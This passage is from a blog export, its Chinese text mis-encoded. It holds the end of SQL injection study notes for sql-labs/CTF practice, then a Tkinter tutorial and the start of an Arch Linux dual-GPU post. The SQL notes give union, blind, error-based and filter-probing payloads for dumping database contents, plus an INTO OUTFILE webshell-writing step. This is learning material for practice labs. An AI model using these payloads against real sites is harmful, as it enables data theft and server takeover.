<p><code>?id=&#39; union select 1, (select group_concat(column_name) from information_schema.columns where table_schema=&#39;&lt;å½“å‰æ•°æ®åº“åç§°&gt;&#39; and table_name=&#39;&lt;å½“å‰è¡¨å&gt;&#39;), 3 %23</code></p>
</li>
<li><p>å­—æ®µå€¼ ( å…¶ä¸­ separator å¯é€‰ ) ï¼š</p>
<p><code>?id=&#39; union select 1,(select group_concat(&lt;æŸ¥è¯¢åˆ°çš„åˆ—å&gt; separator &#39;;&#39;) from &lt;å½“å‰è¡¨å&gt;), 3 %23</code></p>
</li>
</ul>
<h4 id="è·å–å“ˆå¸Œå£ä»¤"><a href="#è·å–å“ˆå¸Œå£ä»¤" class="headerlink" title="è·å–å“ˆå¸Œå£ä»¤"></a>è·å–å“ˆå¸Œå£ä»¤</h4><blockquote>
<p>å“ˆå¸Œå£ä»¤æ˜¯é€šè¿‡ä½¿ç”¨ PASSWORD() å‡½æ•°è®¡ç®—çš„ï¼Œå…·ä½“ç®—æ³•å–å†³äº MySQL å®‰è£…çš„ç‰ˆæœ¬ã€‚<br><code>select password(&#39;admin&#39;)</code><br>ä¹Ÿå¯ä»¥é€šè¿‡åœ¨çº¿è§£å¯†ç½‘ç«™è¿›è¡Œè§£å¯†ã€‚å¦‚ <a href="http://www.cmd5.com/" target="_blank" rel="noopener">CMD5</a></p>
</blockquote>
<h4 id="å†™å…¥-Webshell"><a href="#å†™å…¥-Webshell" class="headerlink" title="å†™å…¥ Webshell"></a>å†™å…¥ Webshell</h4><blockquote>
<p>éœ€è¦å¾—åˆ°ç½‘ç«™çš„ç»å¯¹è·¯å¾„ï¼Œæ•°æ®åº“ç®¡ç†ç³»ç»Ÿæœ‰å‘æœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿå†™æ–‡ä»¶çš„æƒé™ã€‚<br><code>?id=1&#39; union select &quot;&quot; into outfile &quot;D:\\XXX\\conn.php&quot;%23</code></p>
</blockquote>
<h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><p>ä¸Šè¿°æ˜¯ç”¨æœ‰å›æ˜¾æ³¨å…¥ä¸¾ä¾‹è¯´æ˜ Sql æ³¨å…¥çš„åŸºæœ¬è¿‡ç¨‹çš„ä¾‹å­ï¼Œç›²æ³¨è¿‡ç¨‹ä¸æ­¤ç±»ä¼¼ï¼Œåªä¸è¿‡æ²¡æœ‰å›æ˜¾<br>éœ€è¦é€ä½å°è¯•ã€‚</p>
<p>åªè¦å›æ˜¾ä¸­æœ‰å›ºå®šå­—ç¬¦ä¸²ï¼Œéƒ½å¯ä½¿ç”¨ç›²æ³¨è„šæœ¬ã€‚</p>
<h4 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h4><p><code>id=1 union select 1ï¼Œif(SUBSTRING(user(),1,4)=&#39;root&#39;,sleep(5),1),3</code>ï¼ˆsubstring å‡½æ•°çš„ä½œç”¨æ˜¯å°† user()ä»ç¬¬ä¸€ä½å­—æ¯åˆ°ç¬¬å››ä½å­—æ¯æˆªæ–­ã€‚è¿™æ®µå‚æ•°çš„æ³¨å…¥é€»è¾‘æ˜¯ï¼Œuser()çš„ç¬¬ä¸€ä½åˆ°ç¬¬å››ä½å¦‚æœä¸ºâ€™rootâ€™ï¼Œåˆ™é¡µé¢ç­‰å¾… 5 ç§’ï¼Œå¦åˆ™ç»“æœä¸º 1ã€‚ï¼‰</p>
<p>è„šæœ¬ï¼šå¾…è¡¥å……</p>
<h4 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h4><p>è„šæœ¬ï¼šå¾…è¡¥å……</p>
<h2 id="ç»•è¿‡æ–¹å¼"><a href="#ç»•è¿‡æ–¹å¼" class="headerlink" title="ç»•è¿‡æ–¹å¼"></a>ç»•è¿‡æ–¹å¼</h2><h3 id="æ£€æµ‹è¿‡æ»¤çš„å­—ç¬¦ä¸²"><a href="#æ£€æµ‹è¿‡æ»¤çš„å­—ç¬¦ä¸²" class="headerlink" title="æ£€æµ‹è¿‡æ»¤çš„å­—ç¬¦ä¸²"></a>æ£€æµ‹è¿‡æ»¤çš„å­—ç¬¦ä¸²</h3><p>å¯ç”¨å¼‚æˆ–æ³¨å…¥æ£€æµ‹è¿‡æ»¤çš„å­—ç¬¦ä¸²ã€‚å¼‚æˆ–å³ä¸¤ä¸ªæ¡ä»¶åŒçœŸæˆ–åŒå‡å³ä¸ºå‡ï¼Œä¸¤æ¡ä»¶ä¸€çœŸä¸€å‡åˆ™ä¸ºçœŸã€‚</p>
<p>æ ·ä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;^(length(&#39;and&#39;)!&#x3D;0)--+</span><br></pre></td></tr></table></figure>

<p>æ­¤æ ·ä¾‹å¯ç”¨æ¥åˆ¤æ–­ and æ˜¯å¦è¢«è¿‡æ»¤ã€‚è‹¥æ»¡è¶³å¼‚æˆ–æ¡ä»¶åˆ™è¿”å› id=0 å¯¹åº”çš„å€¼ï¼Œå³è¢«è¿‡æ»¤ã€‚ä¸æ»¡è¶³å¼‚æˆ–æ¡ä»¶åˆ™è¿”å› id=1 å¯¹åº”çš„å€¼ï¼Œå³æœªè¢«è¿‡æ»¤ã€‚ä¹Ÿå¯ä»¥ç”¨<code>xor</code>æ¥æ„é€ è¯­å¥ã€‚</p>
<p>ä¸è¿‡ï¼Œæœ‰çš„æ—¶å€™éœ€è¦ä½¿ç”¨ <code>=</code> è€Œä¸æ˜¯ <code>!=</code> æ¥åˆ¤æ–­ã€‚ä¾‹å¦‚ï¼ŒWAF è¿‡æ»¤äº† orï¼Œé‚£ä¹ˆ order çš„ length å°±ä¸º 3ï¼Œè™½ç„¶ä¸ç­‰äº 0ï¼Œä½†æ˜¯æ²¡æœ‰ order çš„åŠŸèƒ½äº†ã€‚</p>
<h2 id="Sql-labsä¸­çš„æŠ€å·§æ€»ç»“"><a href="#Sql-labsä¸­çš„æŠ€å·§æ€»ç»“" class="headerlink" title="Sql-labsä¸­çš„æŠ€å·§æ€»ç»“"></a>Sql-labsä¸­çš„æŠ€å·§æ€»ç»“</h2><h3 id="Less-5-åŒæŸ¥è¯¢æ³¨å…¥ï¼ˆDouble-injectionï¼‰"><a href="#Less-5-åŒæŸ¥è¯¢æ³¨å…¥ï¼ˆDouble-injectionï¼‰" class="headerlink" title="Less-5 åŒæŸ¥è¯¢æ³¨å…¥ï¼ˆDouble injectionï¼‰"></a>Less-5 åŒæŸ¥è¯¢æ³¨å…¥ï¼ˆDouble injectionï¼‰</h3><p>å‚è€ƒï¼š<a href="https://bbs.ichunqiu.com/thread-27209-1-43.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-27209-1-43.html</a></p>
<ul>
<li>COUNT() å‡½æ•°è¿”å›åŒ¹é…æŒ‡å®šæ¡ä»¶çš„è¡Œæ•°ã€‚</li>
<li>RAND() å‡½æ•°ï¼Œç”¨äºäº§ç”Ÿ 0 è‡³ 1 ä¹‹é—´çš„éšæœºæ•°</li>
<li>ORDER BY è¯­å¥ï¼Œé’ˆå¯¹æŸåˆ—æ•°æ®è¿›è¡Œæ’åºï¼Œå¯æ¥åˆ—åæˆ–æ•°å­—ï¼Œå¯æ¥rand()å‡½æ•°è¡¨ç¤ºéšæœºæ’åºã€‚</li>
<li>FLOOR() å‡½æ•°ï¼Œå‘ä¸‹å–æ•´ã€‚</li>
<li>GROUP BY è¯­å¥ç”¨äºç»“åˆ/åˆ†ç»„ã€‚åæ¥æ ¹æ®å“ªä¸ªå­—æ®µè¿›è¡Œåˆ†ç»„ã€‚</li>
<li>è¡¨ç¤ºè¡¨ä¸­çš„åˆ—å¯ç”¨ â€˜.â€™ ç¬¦å·è¿æ¥ï¼Œå½¢å¦‚ï¼šusers.id</li>
</ul>
<p>åŒé‡æŸ¥è¯¢æ³¨å…¥å…¶å®å°±æ˜¯ä¸€ä¸ªselectè¯­å¥ä¸­åµŒå¥—å¦ä¸€ä¸ªselectè¯­å¥ã€‚å¦‚ <code>select count (select database())</code> ,ç»“æœä¸º1ã€‚</p>
<p>ä½¿ç”¨group byå­å¥ç»“åˆrand()å‡½æ•°ä»¥åŠåƒ<code>countï¼ˆ*ï¼‰</code>è¿™æ ·çš„èšåˆå‡½æ•°ï¼Œåœ¨SQLæŸ¥è¯¢æ—¶ä¼šå‡ºç°é”™è¯¯ï¼Œè¿™ç§é”™è¯¯æ˜¯éšæœºäº§ç”Ÿçš„ï¼Œè¿™å°±äº§ç”Ÿäº†åŒé‡æŸ¥è¯¢æ³¨å…¥ã€‚ä½¿ç”¨floor()å‡½æ•°åªæ˜¯ä¸ºäº†å°†æŸ¥è¯¢ç»“æœåˆ†ç±»ã€‚<br>ä½¿ç”¨å¦‚ä¸‹SQLè¯­å¥ï¼Œå‘ç°å¤šæŸ¥è¯¢å‡ æ¬¡ä¼šçˆ†å‡ºduplicate entryçš„é”™è¯¯ï¼Œä¸”å°†æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯éƒ½çˆ†å‡ºæ¥äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;</span><br></pre></td></tr></table></figure>

<h3 id="Less-7-å†™å…¥æ–‡ä»¶ï¼ˆOutfileï¼‰"><a href="#Less-7-å†™å…¥æ–‡ä»¶ï¼ˆOutfileï¼‰" class="headerlink" title="Less-7 å†™å…¥æ–‡ä»¶ï¼ˆOutfileï¼‰"></a>Less-7 å†™å…¥æ–‡ä»¶ï¼ˆOutfileï¼‰</h3><p>å‚è€ƒï¼š<a href="https://www.jianshu.com/p/1f97795443ce" target="_blank" rel="noopener">https://www.jianshu.com/p/1f97795443ce</a></p>
<ul>
<li>SELECT â€¦ INTO OUTFILE â€˜&lt;è·¯å¾„&gt;â€™</li>
<li>å†™å…¥è·¯å¾„ä¸ºæœåŠ¡å™¨ä¸­çš„æŸä¸€è·¯å¾„ï¼Œè€Œä¸æ˜¯å®¢æˆ·ç«¯è·¯å¾„</li>
<li>ä¼šæœ‰æƒé™é™åˆ¶ï¼Œå‡ºç°å†™ä¸è¿›å»çš„æƒ…å†µï¼ˆâ€“secure-file-privï¼‰</li>
<li>å¯ä»¥å¾€é‡Œå†™ğŸï¼Œå¾—shellè¿èœåˆ€ï¼Œç‹‚å–œï¼ˆx</li>
</ul>
<h3 id="Less-8-å¸ƒå°”ç›²æ³¨ï¼ˆBlind-Booleanï¼‰"><a href="#Less-8-å¸ƒå°”ç›²æ³¨ï¼ˆBlind-Booleanï¼‰" class="headerlink" title="Less-8 å¸ƒå°”ç›²æ³¨ï¼ˆBlind-Booleanï¼‰"></a>Less-8 å¸ƒå°”ç›²æ³¨ï¼ˆBlind-Booleanï¼‰</h3><p>å‚è€ƒï¼š</p>
<h2 id="ç”¨Sqlmapè¿‡ä¸€éSql-labs"><a href="#ç”¨Sqlmapè¿‡ä¸€éSql-labs" class="headerlink" title="ç”¨Sqlmapè¿‡ä¸€éSql-labs"></a>ç”¨Sqlmapè¿‡ä¸€éSql-labs</h2><h2 id="é˜²å¾¡ç›¸å…³"><a href="#é˜²å¾¡ç›¸å…³" class="headerlink" title="é˜²å¾¡ç›¸å…³"></a>é˜²å¾¡ç›¸å…³</h2><p> ç›®å‰è¿˜æ²¡ä»€ä¹ˆæ¦‚å¿µï¼Œç­‰ä»¥åå†è¡¥å……ã€‚</p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>æ¸—é€æµ‹è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>Tkinterå­¦ä¹ ç¬”è®°</title>
    <url>/2020/06/16/Tkinter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>ç®€å•çš„Python GUIâ€¦ è¦æƒ³å¼ºå¤§ä¸€ç‚¹è¿˜æ˜¯å»ç”¨PyQtäº†ã€‚</p>
<a id="more"></a>

<h1 id="ä½¿ç”¨é€»è¾‘"><a href="#ä½¿ç”¨é€»è¾‘" class="headerlink" title="ä½¿ç”¨é€»è¾‘"></a>ä½¿ç”¨é€»è¾‘</h1><ol>
<li><p>import tkinterã€‚</p>
</li>
<li><p>å®ä¾‹åŒ–çª—å£å¯¹è±¡ã€‚ä¾‹å¦‚</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">window</span> = tkinter.Tk()</span><br></pre></td></tr></table></figure></li>
<li><p>å¯¹åˆšæ‰å®ä¾‹åŒ–çš„çª—å£å¯¹è±¡è¿›è¡Œè®¾ç½®ï¼Œå¦‚</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">window</span>.<span class="meta">title</span>(<span class="string">'This is a titie.'</span>)</span><br><span class="line"><span class="meta">window</span>.geometry(<span class="string">'200x100'</span>)   # ä¸­é—´çš„ç¬¦å·æ˜¯è‹±æ–‡å­—æ¯<span class="string">'x'</span></span><br></pre></td></tr></table></figure></li>
<li><p>å®ä¾‹åŒ–å„çª—å£å†…çš„æ§ä»¶å¹¶å°†å…¶æ”¾ç½®åœ¨çª—å£çš„æŸä¸ªä½ç½®ï¼Œä¾‹å¦‚</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å®ä¾‹åŒ–æ ‡ç­¾å¯¹è±¡, æ³¨æ„ï¼šæ–¹æ³•çš„é¦–å­—æ¯å¤§å†™</span></span><br><span class="line">label = tkinter.Label(window, <span class="attribute">text</span>=<span class="string">''</span>, <span class="attribute">textvariable</span>=..., font=(<span class="string">'Consolas'</span>, 20, <span class="string">'bold'</span>), <span class="attribute">width</span>=150, <span class="attribute">height</span>=100)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ”¾ç½®åœ¨çª—å£çš„æŸä¸ªä½ç½®</span></span><br><span class="line">label.pack()</span><br></pre></td></tr></table></figure></li>
<li><p>ä»¤ä¸»çª—å£è‡ªæˆ‘åˆ·æ–°ï¼Œå®ŒæˆGUIçš„äº¤äº’ä½œç”¨ï¼Œå¦‚</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.mainloop()</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="ç®€å•æ§ä»¶çš„ä½¿ç”¨æ–¹æ³•å°ç»“"><a href="#ç®€å•æ§ä»¶çš„ä½¿ç”¨æ–¹æ³•å°ç»“" class="headerlink" title="ç®€å•æ§ä»¶çš„ä½¿ç”¨æ–¹æ³•å°ç»“"></a>ç®€å•æ§ä»¶çš„ä½¿ç”¨æ–¹æ³•å°ç»“</h1><ul>
<li><p>Labelæ§ä»¶</p>
<p>Labelæ§ä»¶æ˜¯tkinterä¸­çš„æ ‡ç­¾æ§ä»¶ã€‚ç”¨äºæ˜¾ç¤ºæ–‡æœ¬å’Œå›¾åƒã€‚è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">label = tkinter.<span class="constructor">Label( <span class="params">master</span>, <span class="params">options</span>, <span class="operator">...</span>)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>master: æ¡†æ¶çš„çˆ¶å®¹å™¨ï¼Œå¯ç†è§£ä¸ºæŸä¸ªçª—å£ã€‚</p>
</li>
<li><p>options: å¯è®¾ç½®çš„å±æ€§ã€‚è¿™äº›é€‰é¡¹å¯ä»¥ç”¨é”®å€¼å¯¹çš„å½¢å¼è®¾ç½®ï¼Œå¹¶ä»¥é€—å·åˆ†éš”ã€‚</p>
<p>ä»¥ä¸‹æ˜¯å¯é€‰é¡¹æ¸…å•ï¼š</p>
<table>
<thead>
<tr>
<th align="center">åºå·</th>
<th align="center">å¯é€‰é¡¹ &amp; æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">**anchor **    æ–‡æœ¬æˆ–å›¾åƒåœ¨èƒŒæ™¯å†…å®¹åŒºçš„ä½ç½®ï¼Œé»˜è®¤ä¸º centerï¼Œå¯é€‰å€¼ä¸ºï¼ˆn,s,w,e,ne,nw,sw,se,centerï¼‰eswn æ˜¯ä¸œå—è¥¿åŒ—è‹±æ–‡çš„é¦–å­—æ¯ï¼Œè¡¨ç¤ºï¼šä¸ŠåŒ—ä¸‹å—å·¦è¥¿å³ä¸œã€‚</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center"><strong>bg</strong>  æ ‡ç­¾èƒŒæ™¯é¢œè‰²</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center"><strong>bd</strong>  æ ‡ç­¾çš„å¤§å°ï¼Œé»˜è®¤ä¸º 2 ä¸ªåƒç´ </td>
</tr>
<tr>
<td align="center">4</td>
<td align="center"><strong>bitmap</strong>  æŒ‡å®šæ ‡ç­¾ä¸Šçš„ä½å›¾ï¼Œå¦‚æœæŒ‡å®šäº†å›¾ç‰‡ï¼Œåˆ™è¯¥é€‰é¡¹å¿½ç•¥</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">**cursor ** é¼ æ ‡ç§»åŠ¨åˆ°æ ‡ç­¾æ—¶ï¼Œå…‰æ ‡çš„å½¢çŠ¶ï¼Œå¯ä»¥è®¾ç½®ä¸º arrow, circle, cross, plus ç­‰ã€‚</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">**font ** è®¾ç½®å­—ä½“ã€‚</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">**fg ** è®¾ç½®å‰æ™¯è‰²ã€‚</td>
</tr>
<tr>
<td align="center">8</td>
<td align="center">**height ** æ ‡ç­¾çš„é«˜åº¦ï¼Œé»˜è®¤å€¼æ˜¯ 0ã€‚</td>
</tr>
<tr>
<td align="center">9</td>
<td align="center">**image ** è®¾ç½®æ ‡ç­¾å›¾åƒã€‚</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center"><strong>justify</strong> å®šä¹‰å¯¹é½æ–¹å¼ï¼Œå¯é€‰å€¼æœ‰ï¼šLEFT,RIGHT,CENTERï¼Œé»˜è®¤ä¸º CENTERã€‚</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center"><strong>padx</strong>  xè½´é—´è·ï¼Œä»¥åƒç´ è®¡ï¼Œé»˜è®¤ 1ã€‚</td>
</tr>
<tr>
<td align="center">12</td>
<td align="center"><strong>pady</strong>  yè½´é—´è·ï¼Œä»¥åƒç´ è®¡ï¼Œé»˜è®¤ 1ã€‚</td>
</tr>
<tr>
<td align="center">13</td>
<td align="center"><strong>relief</strong>  è¾¹æ¡†æ ·å¼ï¼Œå¯é€‰çš„æœ‰ï¼šFLATã€SUNKENã€RAISEDã€GROOVEã€RIDGEã€‚é»˜è®¤ä¸º FLATã€‚</td>
</tr>
<tr>
<td align="center"><strong>14</strong></td>
<td align="center">**text ** è®¾ç½®æ–‡æœ¬ï¼Œå¯ä»¥åŒ…å«æ¢è¡Œç¬¦(\n)ã€‚</td>
</tr>
<tr>
<td align="center"><strong>15</strong></td>
<td align="center"><strong>textvariable</strong>  æ ‡ç­¾æ˜¾ç¤º Tkinter å˜é‡ï¼ŒStringVarã€‚å¦‚æœå˜é‡è¢«ä¿®æ”¹ï¼Œæ ‡ç­¾æ–‡æœ¬å°†è‡ªåŠ¨æ›´æ–°ã€‚</td>
</tr>
<tr>
<td align="center">16</td>
<td align="center">**underline ** è®¾ç½®ä¸‹åˆ’çº¿ï¼Œé»˜è®¤ -1ï¼Œå¦‚æœè®¾ç½® 1ï¼Œåˆ™æ˜¯ä»ç¬¬äºŒä¸ªå­—ç¬¦å¼€å§‹ç”»ä¸‹åˆ’çº¿ã€‚</td>
</tr>
<tr>
<td align="center">17</td>
<td align="center">**width ** è®¾ç½®æ ‡ç­¾å®½åº¦ï¼Œé»˜è®¤å€¼æ˜¯ 0ï¼Œè‡ªåŠ¨è®¡ç®—ï¼Œå•ä½ä»¥åƒç´ è®¡ã€‚</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">**wraplength ** è®¾ç½®æ ‡ç­¾æ–‡æœ¬ä¸ºå¤šå°‘è¡Œæ˜¾ç¤ºï¼Œé»˜è®¤ä¸º 0ã€‚</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>Buttonæ§ä»¶</p>
<p>Buttonæ§ä»¶æ˜¯tkinterä¸­çš„æŒ‰é’®æ§ä»¶ã€‚ç”¨äºåœ¨ç¨‹åºä¸­æ˜¾ç¤ºæŒ‰é’®ã€‚æŒ‰é’®å¯ä¸ä¸€ä¸ªcommandå‡½æ•°è¿›è¡Œå…³è”ï¼Œåœ¨æŒ‰ä¸‹æŒ‰é’®æ—¶æ‰§è¡Œcommandå‡½æ•°ã€‚è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">button = tkinter.Button ( master, <span class="attribute">option</span>=value, <span class="built_in">..</span>. )</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸‹æ˜¯å¯é€‰é¡¹æ¸…å•ï¼š</p>
<table>
<thead>
<tr>
<th align="center">åºå·</th>
<th align="center">å¯é€‰é¡¹ &amp; æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center"><strong>activebackground</strong>  å½“é¼ æ ‡æ”¾ä¸Šå»æ—¶ï¼ŒæŒ‰é’®çš„èƒŒæ™¯è‰²</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">**activeforeground ** å½“é¼ æ ‡æ”¾ä¸Šå»æ—¶ï¼ŒæŒ‰é’®çš„å‰æ™¯è‰²</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">**bd ** æŒ‰é’®è¾¹æ¡†çš„å¤§å°ï¼Œé»˜è®¤ä¸º 2 ä¸ªåƒç´ </td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">**bg ** æŒ‰é’®çš„èƒŒæ™¯è‰²</td>
</tr>
<tr>
<td align="center"><strong>5</strong></td>
<td align="center"><strong>command</strong>  æŒ‰é’®å…³è”çš„å‡½æ•°ï¼Œå½“æŒ‰é’®è¢«ç‚¹å‡»æ—¶ï¼Œæ‰§è¡Œè¯¥å‡½æ•°</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">**fg ** æŒ‰é’®çš„å‰æ™¯è‰²ï¼ˆæŒ‰é’®æ–‡æœ¬çš„é¢œè‰²ï¼‰</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">**font ** æ–‡æœ¬å­—ä½“</td>
</tr>
<tr>
<td align="center">8</td>
<td align="center">**height ** æŒ‰é’®çš„é«˜åº¦</td>
</tr>
<tr>
<td align="center">9</td>
<td align="center">**highlightcolor ** è¦é«˜äº®çš„é¢œè‰²</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center"><strong>image</strong>  æŒ‰é’®ä¸Šè¦æ˜¾ç¤ºçš„å›¾ç‰‡</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">**justify ** æ˜¾ç¤ºå¤šè¡Œæ–‡æœ¬çš„æ—¶å€™,è®¾ç½®ä¸åŒè¡Œä¹‹é—´çš„å¯¹é½æ–¹å¼ï¼Œå¯é€‰é¡¹åŒ…æ‹¬LEFT, RIGHT, CENTER</td>
</tr>
<tr>
<td align="center">12</td>
<td align="center">**padx **  æŒ‰é’®åœ¨xè½´æ–¹å‘ä¸Šçš„å†…è¾¹è·(padding)ï¼Œæ˜¯æŒ‡æŒ‰é’®çš„å†…å®¹ä¸æŒ‰é’®è¾¹ç¼˜çš„è·ç¦»</td>
</tr>
<tr>
<td align="center">13</td>
<td align="center">**pady ** æŒ‰é’®åœ¨yè½´æ–¹å‘ä¸Šçš„å†…è¾¹è·(padding)</td>
</tr>
<tr>
<td align="center">14</td>
<td align="center">**relief ** è¾¹æ¡†æ ·å¼ï¼Œè®¾ç½®æ§ä»¶3Dæ•ˆæœï¼Œå¯é€‰çš„æœ‰ï¼šFLATã€SUNKENã€RAISEDã€GROOVEã€RIDGEã€‚é»˜è®¤ä¸º FLATã€‚</td>
</tr>
<tr>
<td align="center">15</td>
<td align="center">**state ** è®¾ç½®æŒ‰é’®ç»„ä»¶çŠ¶æ€,å¯é€‰çš„æœ‰NORMALã€ACTIVEã€ DISABLEDã€‚é»˜è®¤ NORMALã€‚</td>
</tr>
<tr>
<td align="center">16</td>
<td align="center">**underline ** ä¸‹åˆ’çº¿ã€‚é»˜è®¤æŒ‰é’®ä¸Šçš„æ–‡æœ¬éƒ½ä¸å¸¦ä¸‹åˆ’çº¿ã€‚å–å€¼å°±æ˜¯å¸¦ä¸‹åˆ’çº¿çš„å­—ç¬¦ä¸²ç´¢å¼•ï¼Œä¸º 0 æ—¶ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦å¸¦ä¸‹åˆ’çº¿ï¼Œä¸º 1 æ—¶ï¼Œå‰ä¸¤ä¸ªå­—ç¬¦å¸¦ä¸‹åˆ’çº¿ï¼Œä»¥æ­¤ç±»æ¨</td>
</tr>
<tr>
<td align="center">17</td>
<td align="center">**width ** æŒ‰é’®çš„å®½åº¦ï¼Œå¦‚æœªè®¾ç½®æ­¤é¡¹ï¼Œå…¶å¤§å°ä»¥é€‚åº”æŒ‰é’®çš„å†…å®¹ï¼ˆæ–‡æœ¬æˆ–å›¾ç‰‡çš„å¤§å°ï¼‰</td>
</tr>
<tr>
<td align="center">18</td>
<td align="center">**wraplength ** é™åˆ¶æŒ‰é’®æ¯è¡Œæ˜¾ç¤ºçš„å­—ç¬¦çš„æ•°é‡</td>
</tr>
<tr>
<td align="center">19</td>
<td align="center">**text ** æŒ‰é’®çš„æ–‡æœ¬å†…å®¹</td>
</tr>
<tr>
<td align="center">19</td>
<td align="center"><strong>anchor</strong>  é”šé€‰é¡¹ï¼Œæ§åˆ¶æ–‡æœ¬çš„ä½ç½®ï¼Œé»˜è®¤ä¸ºä¸­å¿ƒ</td>
</tr>
</tbody></table>
</li>
</ul>
]]></content>
      <categories>
        <category>å¼€å‘</category>
      </categories>
      <tags>
        <tag>å¼€å‘</tag>
        <tag>python</tag>
        <tag>GUI</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨Optimusåœ¨ArchLinuxä¸‹é…ç½®åŒæ˜¾å¡åŒæ˜¾ç¤ºå™¨</title>
    <url>/2021/04/05/%E4%BD%BF%E7%94%A8Optimus%E5%9C%A8ArchLinux%E4%B8%8B%E9%85%8D%E7%BD%AE%E5%8F%8C%E6%98%BE%E5%8D%A1%E5%8F%8C%E6%98%BE%E7%A4%BA%E5%99%A8/</url>
    <content><![CDATA[<p>ArchLinuxä½¿ç”¨è¿‡ç¨‹ä¸­å‘ç°ç¬”è®°æœ¬ç”µè„‘åŒæ˜¾å¡å’ŒåŒæ˜¾ç¤ºå™¨å·¥ä½œä¸æ­£å¸¸ï¼Œä»¥ä¸‹æ˜¯ä¸ªäººçš„è§£å†³æ–¹æ¡ˆï¼Œå‚è€ƒArchWikiï¼Œä»…ä¾›å‚è€ƒã€‚</p>
<a id="more"></a>

<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p><strong>OS</strong>: Arch Linux x86_64</p>
<p><strong>Kernel</strong>: 5.11.11-arch1-1 </p>
<p><strong>DE</strong>: KDE Plasma 5.21.3</p>
<p><strong>GPU0</strong>: NVIDIA GeForce GTX 1050 Mobile</p>
<p><strong>GPU1</strong>: Intel UHD Graphics 630</p>
<p><strong>Monitor0</strong>ä¸ºç¬”ç”µè‡ªå¸¦å±å¹•ï¼Œ<strong>Monitor1</strong>ä¸ºHDMIè¿æ¥çš„å¤–æ¥æ˜¾ç¤ºå™¨ã€‚</p>
<h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>ä½¿ç”¨HDMIæ¥å…¥å¤–æ¥æ˜¾ç¤ºå™¨ï¼Œç”±äºç¬”è®°æœ¬ç”µè„‘è‡ªå¸¦çš„å±å¹•é»˜è®¤ä½¿ç”¨äº†Intelçš„æ ¸æ˜¾ï¼Œè€ŒHDMIæ¥å…¥çš„æ˜¾ç¤ºå™¨ä¼šä½¿ç”¨NVIDIAçš„æ˜¾å¡ï¼Œé€ æˆç¦ç”¨è‡ªå¸¦å±å¹•æ—¶çš„æ’•è£‚å’Œæ¸²æŸ“å·¨æ…¢çš„é—®é¢˜ã€‚</p>
